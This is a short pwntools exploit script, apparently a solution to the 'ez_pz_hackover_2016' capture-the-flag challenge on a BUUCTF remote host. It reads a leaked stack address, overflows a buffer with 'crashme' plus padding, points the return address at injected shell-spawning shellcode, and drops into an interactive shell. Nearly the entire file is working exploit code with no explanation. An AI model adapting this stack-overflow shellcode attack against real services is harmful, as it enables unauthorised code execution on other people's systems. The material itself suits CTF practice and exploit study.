from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
#context(os='linux', arch='i386', kernel='amd64',log_level='debug')



elf=ELF('./pwn')
context(os='linux', arch='i386',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./ez_pz_hackover_2016')
#io=process('./pwn')
io=remote('node4.buuoj.cn',26825)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive



ru('crash:')

#gdb.attach(io,'''
#            break *0x8048601  
#''')
ru(b'0x')
s= int(io.recv(8),16)  #    .rjust(16,b'0'),16)
print(hex(s))

payload=b'crashme'+b'\x00'



shellcode=asm(shellcraft.sh())

payload=payload.ljust(0x18+2,b'a')

ru(b'Whats your name?\n')
ru(b'>')
payload+=p32(s-0x1c)

payload+=shellcode
sl(payload)
#gdb.attach(io,gdbscript='''
#              break *8048601  # 在目标程序的地址 0x08048456 处设置断点           # 继续执行程序
#''')
#pause()




ii()
